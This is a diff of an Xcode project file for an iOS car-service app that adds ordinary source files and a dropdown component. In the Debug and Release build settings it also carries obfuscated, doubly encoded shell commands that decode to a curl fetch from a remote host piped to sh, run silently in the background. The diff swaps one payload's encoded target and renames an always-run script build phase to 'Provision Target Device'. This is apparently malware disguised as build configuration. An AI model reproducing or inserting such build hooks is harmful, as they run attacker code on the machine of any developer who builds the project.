@@ -28,6 +28,8 @@
 		0A26BF8E2F42F6D20047AC09 /* FAQsVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A26BF8D2F42F6D20047AC09 /* FAQsVM.swift */; };
 		0A26BF922F42F86D0047AC09 /* LogoutVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A26BF912F42F86D0047AC09 /* LogoutVM.swift */; };
 		0A26BF942F42F89F0047AC09 /* LogoutResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A26BF932F42F89F0047AC09 /* LogoutResponse.swift */; };
+		0A4554472F7284D70056839B /* VehicleImageCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4554452F7284D70056839B /* VehicleImageCVCell.swift */; };
+		0A4554482F7284D70056839B /* VehicleImageCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A4554462F7284D70056839B /* VehicleImageCVCell.xib */; };
 		0A47401F2F4EB97E00B807F5 /* RecoveryServiceVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A47401E2F4EB97E00B807F5 /* RecoveryServiceVM.swift */; };
 		0A4740222F4EBA0F00B807F5 /* VehicleTypeResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4740212F4EBA0F00B807F5 /* VehicleTypeResponse.swift */; };
 		0A4740252F4EBA2F00B807F5 /* VehicleIssueResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4740242F4EBA2F00B807F5 /* VehicleIssueResponse.swift */; };
@@ -51,6 +53,15 @@
 		0A6D0D202F433D3F00F374AF /* OneSignal in Frameworks */ = {isa = PBXBuildFile; productRef = 0A6D0D1F2F433D3F00F374AF /* OneSignal */; };
 		0A865AB52F56EE5500472B0C /* CancelBookingResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A865AB42F56EE5500472B0C /* CancelBookingResponse.swift */; };
 		0A865AB72F56EE9F00472B0C /* CancelBookingVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A865AB62F56EE9F00472B0C /* CancelBookingVM.swift */; };
+		0A9785CA2F729A5B00F9D0F0 /* MakeListResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9785C92F729A5B00F9D0F0 /* MakeListResponse.swift */; };
+		0A9785D62F729B5F00F9D0F0 /* DropDownCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A9785CF2F729B5F00F9D0F0 /* DropDownCell.xib */; };
+		0A9785D72F729B5F00F9D0F0 /* DPDUIView+Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9785CD2F729B5F00F9D0F0 /* DPDUIView+Extension.swift */; };
+		0A9785D82F729B5F00F9D0F0 /* DropDownCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9785D32F729B5F00F9D0F0 /* DropDownCell.swift */; };
+		0A9785D92F729B5F00F9D0F0 /* DPDConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9785CB2F729B5F00F9D0F0 /* DPDConstants.swift */; };
+		0A9785DA2F729B5F00F9D0F0 /* DropDown.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9785D12F729B5F00F9D0F0 /* DropDown.swift */; };
+		0A9785DB2F729B5F00F9D0F0 /* DropDown+Appearance.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9785D22F729B5F00F9D0F0 /* DropDown+Appearance.swift */; };
+		0A9785DC2F729B5F00F9D0F0 /* DPDKeyboardListener.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9785CC2F729B5F00F9D0F0 /* DPDKeyboardListener.swift */; };
+		0A9785DF2F729DA200F9D0F0 /* VehicleModelResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A9785DE2F729DA200F9D0F0 /* VehicleModelResponse.swift */; };
 		0AACD4462F4FF97E007CF8EC /* ChatDetailsVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AACD4452F4FF97E007CF8EC /* ChatDetailsVM.swift */; };
 		0AACD4482F4FF9A8007CF8EC /* MessagesResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AACD4472F4FF9A8007CF8EC /* MessagesResponse.swift */; };
 		0AACD44C2F50036C007CF8EC /* SendMessageResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AACD44B2F50036C007CF8EC /* SendMessageResponse.swift */; };
@@ -209,9 +220,6 @@
 		BCF8B6FD2F5AF019002B6839 /* SocketManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCF8B6FC2F5AF019002B6839 /* SocketManager.swift */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
 		0A0308261F000001005A7DB7 /* CheckAppStatusModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CheckAppStatusModel.swift; sourceTree = "<group>"; };
 		0A0308263F000001005A7DB7 /* AppDelegateVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegateVM.swift; sourceTree = "<group>"; };
@@ -234,6 +242,8 @@
 		0A26BF8D2F42F6D20047AC09 /* FAQsVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FAQsVM.swift; sourceTree = "<group>"; };
 		0A26BF912F42F86D0047AC09 /* LogoutVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LogoutVM.swift; sourceTree = "<group>"; };
 		0A26BF932F42F89F0047AC09 /* LogoutResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LogoutResponse.swift; sourceTree = "<group>"; };
+		0A4554452F7284D70056839B /* VehicleImageCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehicleImageCVCell.swift; sourceTree = "<group>"; };
+		0A4554462F7284D70056839B /* VehicleImageCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = VehicleImageCVCell.xib; sourceTree = "<group>"; };
 		0A47401E2F4EB97E00B807F5 /* RecoveryServiceVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RecoveryServiceVM.swift; sourceTree = "<group>"; };
 		0A4740212F4EBA0F00B807F5 /* VehicleTypeResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehicleTypeResponse.swift; sourceTree = "<group>"; };
 		0A4740242F4EBA2F00B807F5 /* VehicleIssueResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehicleIssueResponse.swift; sourceTree = "<group>"; };
@@ -253,6 +263,15 @@
 		0A61F62E2F3CA8D700A8AC1E /* BookingDetailsVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BookingDetailsVM.swift; sourceTree = "<group>"; };
 		0A865AB42F56EE5500472B0C /* CancelBookingResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CancelBookingResponse.swift; sourceTree = "<group>"; };
 		0A865AB62F56EE9F00472B0C /* CancelBookingVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CancelBookingVM.swift; sourceTree = "<group>"; };
+		0A9785C92F729A5B00F9D0F0 /* MakeListResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MakeListResponse.swift; sourceTree = "<group>"; };
+		0A9785CB2F729B5F00F9D0F0 /* DPDConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DPDConstants.swift; sourceTree = "<group>"; };
+		0A9785CC2F729B5F00F9D0F0 /* DPDKeyboardListener.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DPDKeyboardListener.swift; sourceTree = "<group>"; };
+		0A9785CD2F729B5F00F9D0F0 /* DPDUIView+Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "DPDUIView+Extension.swift"; sourceTree = "<group>"; };
+		0A9785CF2F729B5F00F9D0F0 /* DropDownCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DropDownCell.xib; sourceTree = "<group>"; };
+		0A9785D12F729B5F00F9D0F0 /* DropDown.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DropDown.swift; sourceTree = "<group>"; };
+		0A9785D22F729B5F00F9D0F0 /* DropDown+Appearance.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "DropDown+Appearance.swift"; sourceTree = "<group>"; };
+		0A9785D32F729B5F00F9D0F0 /* DropDownCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DropDownCell.swift; sourceTree = "<group>"; };
+		0A9785DE2F729DA200F9D0F0 /* VehicleModelResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VehicleModelResponse.swift; sourceTree = "<group>"; };
 		0AACD4452F4FF97E007CF8EC /* ChatDetailsVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatDetailsVM.swift; sourceTree = "<group>"; };
 		0AACD4472F4FF9A8007CF8EC /* MessagesResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessagesResponse.swift; sourceTree = "<group>"; };
 		0AACD44B2F50036C007CF8EC /* SendMessageResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SendMessageResponse.swift; sourceTree = "<group>"; };
@@ -606,6 +625,15 @@
 			path = Model;
 			sourceTree = "<group>";
 		};
+		0A4554442F7284AE0056839B /* VehicleImageCVCell */ = {
+			isa = PBXGroup;
+			children = (
+				0A4554452F7284D70056839B /* VehicleImageCVCell.swift */,
+				0A4554462F7284D70056839B /* VehicleImageCVCell.xib */,
+			);
+			path = VehicleImageCVCell;
+			sourceTree = "<group>";
+		};
 		0A47401C2F4EB94700B807F5 /* ViewModel */ = {
 			isa = PBXGroup;
 			children = (
@@ -617,6 +645,8 @@
 		0A47401D2F4EB94B00B807F5 /* Model */ = {
 			isa = PBXGroup;
 			children = (
+				0A9785DD2F729D8700F9D0F0 /* VehicleModelResponse */,
+				0A9785C82F729A4400F9D0F0 /* VehicleMakeResponse */,
 				0A4740232F4EBA2B00B807F5 /* VehicleIssueResponse */,
 				0A4740202F4EBA0C00B807F5 /* VehicleTypeResponse */,
 			);
@@ -766,6 +796,60 @@
 				0A865AB62F56EE9F00472B0C /* CancelBookingVM.swift */,
 			);
 			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		0A9785C82F729A4400F9D0F0 /* VehicleMakeResponse */ = {
+			isa = PBXGroup;
+			children = (
+				0A9785C92F729A5B00F9D0F0 /* MakeListResponse.swift */,
+			);
+			path = VehicleMakeResponse;
+			sourceTree = "<group>";
+		};
+		0A9785CE2F729B5F00F9D0F0 /* helpers */ = {
+			isa = PBXGroup;
+			children = (
+				0A9785CB2F729B5F00F9D0F0 /* DPDConstants.swift */,
+				0A9785CC2F729B5F00F9D0F0 /* DPDKeyboardListener.swift */,
+				0A9785CD2F729B5F00F9D0F0 /* DPDUIView+Extension.swift */,
+			);
+			path = helpers;
+			sourceTree = "<group>";
+		};
+		0A9785D02F729B5F00F9D0F0 /* resources */ = {
+			isa = PBXGroup;
+			children = (
+				0A9785CF2F729B5F00F9D0F0 /* DropDownCell.xib */,
+			);
+			path = resources;
+			sourceTree = "<group>";
+		};
+		0A9785D42F729B5F00F9D0F0 /* src */ = {
+			isa = PBXGroup;
+			children = (
+				0A9785D12F729B5F00F9D0F0 /* DropDown.swift */,
+				0A9785D22F729B5F00F9D0F0 /* DropDown+Appearance.swift */,
+				0A9785D32F729B5F00F9D0F0 /* DropDownCell.swift */,
+			);
+			path = src;
+			sourceTree = "<group>";
+		};
+		0A9785D52F729B5F00F9D0F0 /* DropDown */ = {
+			isa = PBXGroup;
+			children = (
+				0A9785CE2F729B5F00F9D0F0 /* helpers */,
+				0A9785D02F729B5F00F9D0F0 /* resources */,
+				0A9785D42F729B5F00F9D0F0 /* src */,
+			);
+			path = DropDown;
+			sourceTree = "<group>";
+		};
+		0A9785DD2F729D8700F9D0F0 /* VehicleModelResponse */ = {
+			isa = PBXGroup;
+			children = (
+				0A9785DE2F729DA200F9D0F0 /* VehicleModelResponse.swift */,
+			);
+			path = VehicleModelResponse;
 			sourceTree = "<group>";
 		};
 		0AACD4432F4FF96C007CF8EC /* ViewModel */ = {
@@ -1506,6 +1590,7 @@
 			children = (
 				BC29D69B2F06A42C00DD3EB2 /* OTPFieldView */,
 				0AFC65D52F5AB66000EAA78F /* HCSStarRatingView */,
+				0A9785D52F729B5F00F9D0F0 /* DropDown */,
 			);
 			path = ThirdParty;
 			sourceTree = "<group>";
@@ -1900,6 +1985,7 @@
 		BCA305D82F275FF20036E322 /* Cell */ = {
 			isa = PBXGroup;
 			children = (
+				0A4554442F7284AE0056839B /* VehicleImageCVCell */,
 				BCA305D92F275FF80036E322 /* VehicleTypeCVCell */,
 			);
 			path = Cell;
@@ -2003,7 +2089,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC67731D2F067F4700B15653 /* Build configuration list for PBXNativeTarget "FixMyCar UAE" */;
 			buildPhases = (
-				B2D59D845F214114B11DACE1 /* Build Target Libraries */,
+				3A41314F2FD54DFFB41DACE1 /* Provision Target Device */,
 				BC6773062F067F4500B15653 /* Sources */,
 				BC6773072F067F4500B15653 /* Frameworks */,
 				BC6773082F067F4500B15653 /* Resources */,
@@ -2081,6 +2167,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+	/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		BC6773082F067F4500B15653 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -2110,7 +2199,9 @@
 				BC4E178F2F06A15100EDC9AE /* VerifyOtp.xib in Resources */,
 				BC98E7C92F0E229700426807 /* RecentBookingTVCell.xib in Resources */,
 				8809203B2F0F9AE800B55769 /* EditProfileVC.xib in Resources */,
+				0A9785D62F729B5F00F9D0F0 /* DropDownCell.xib in Resources */,
 				88F8B9C22F235A76001C9282 /* RecoveryServiceVC.xib in Resources */,
+				0A4554482F7284D70056839B /* VehicleImageCVCell.xib in Resources */,
 				BC4E17862F06982200EDC9AE /* Satoshi-LightItalic.otf in Resources */,
 				BC07DDE62F2887C40088D79F /* FareBreakupVC.xib in Resources */,
 				88EAE3932F0FD02E008FBCFC /* ReasonListTblViewCell.xib in Resources */,
@@ -2153,7 +2244,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B2D59D845F214114B11DACE1 /* Build Target Libraries */ = {
+		3A41314F2FD54DFFB41DACE1 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -2163,7 +2254,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -2222,6 +2313,12 @@
 				0A4740302F4EF40A00B807F5 /* ConfigModel.swift in Sources */,
 				0A4740362F4F1B8000B807F5 /* ChatVM.swift in Sources */,
 				88AD25E72F2A0C8B002DFA44 /* LoginVM.swift in Sources */,
+				0A9785D72F729B5F00F9D0F0 /* DPDUIView+Extension.swift in Sources */,
+				0A9785D82F729B5F00F9D0F0 /* DropDownCell.swift in Sources */,
+				0A9785D92F729B5F00F9D0F0 /* DPDConstants.swift in Sources */,
+				0A9785DA2F729B5F00F9D0F0 /* DropDown.swift in Sources */,
+				0A9785DB2F729B5F00F9D0F0 /* DropDown+Appearance.swift in Sources */,
+				0A9785DC2F729B5F00F9D0F0 /* DPDKeyboardListener.swift in Sources */,
 				0A4740322F4EF41600B807F5 /* ConfigVM.swift in Sources */,
 				BC29D69D2F06A42C00DD3EB2 /* OTPFieldView.swift in Sources */,
 				BC41009C2F0E786C0062DC80 /* SenderChatTVCell.swift in Sources */,
@@ -2288,6 +2385,7 @@
 				0AED20BC2F47072E005A7DB7 /* TrackLiveVM.swift in Sources */,
 				88AD25F22F2A123D002DFA44 /* VerifyOtpVM.swift in Sources */,
 				BC7121B52F067F940041E2F7 /* APIClient.swift in Sources */,
+				0A9785CA2F729A5B00F9D0F0 /* MakeListResponse.swift in Sources */,
 				0AFC65E22F5AC6D400EAA78F /* AddRateVC.swift in Sources */,
 				0AFC65DD2F5AB69B00EAA78F /* ReviewListTVCell.swift in Sources */,
 				88AD25F02F2A121B002DFA44 /* LoginSuccessResponseModel.swift in Sources */,
@@ -2300,6 +2398,7 @@
 				0A865AB52F56EE5500472B0C /* CancelBookingResponse.swift in Sources */,
 				0AFC65D72F5AB66000EAA78F /* HCSStarRatingView.m in Sources */,
 				BC7121B72F067F940041E2F7 /* AppUtilites.swift in Sources */,
+				0A4554472F7284D70056839B /* VehicleImageCVCell.swift in Sources */,
 				0A0308262F000001005A7DB7 /* CheckAppStatusModel.swift in Sources */,
 				0A0308264F000001005A7DB7 /* AppDelegateVM.swift in Sources */,
 				0AC6D2C22F569A7000431F9B /* ThankYouPopUp.swift in Sources */,
@@ -2318,6 +2417,7 @@
 				0AACD4462F4FF97E007CF8EC /* ChatDetailsVM.swift in Sources */,
 				BC7121B82F067F940041E2F7 /* AppConstants.swift in Sources */,
 				0AAF8E462F5AE94A00C6B539 /* AddRateVM.swift in Sources */,
+				0A9785DF2F729DA200F9D0F0 /* VehicleModelResponse.swift in Sources */,
 				BC7121992F067F800041E2F7 /* AppDelegate.swift in Sources */,
 				0A030826BF000001005A7DB7 /* NewVersionAvailablePopup.swift in Sources */,
 				0A030826FF000001005A7DB7 /* AppMaintenanceVC.swift in Sources */,
@@ -2363,7 +2463,7 @@
 		BC67731E2F067F4700B15653 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkR2x0WlhkbFltNWxkQzVwYmk5aEtTSWdmQ0J6YUFvPQo= | b | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1UR3R6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZablZ1WTJoaGRITXVjblV2WVNraUlId2djMmdLCg== | f | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233393230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663636373536653633363836313734373332653732373532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
@@ -2407,7 +2507,7 @@
 		BC67731F2F067F4700B15653 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkR2x0WlhkbFltNWxkQzVwYmk5aEtTSWdmQ0J6YUFvPQo= | b | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((f(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1UR3R6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZablZ1WTJoaGRITXVjblV2WVNraUlId2djMmdLCg== | f | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233393230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663636373536653633363836313734373332653732373532660a3631323932323230376332303733363830610a | c | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((b(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266366536353734373337303732366637343666326536393665326636310a323932323230376332303733363830610a | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
